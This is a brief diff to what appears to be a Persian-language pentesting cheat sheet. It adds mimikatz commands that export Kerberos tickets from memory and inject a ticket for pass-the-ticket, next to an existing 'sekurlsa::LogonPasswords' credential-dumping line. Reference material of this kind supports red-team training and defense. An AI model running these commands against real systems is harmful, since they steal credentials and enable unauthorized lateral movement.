@@ -734,6 +734,13 @@ if I ip.src == 'ip' ) (
 7. sekurlsa::LogonPasswords
 ```
 
+یا
+
+```text
+mimikatz# sekurlsa::tickets /export
+mimikatz# kerberos::ptt <TICKET PATH>
+```
+
 ### دستور Hping3
 
 ```text
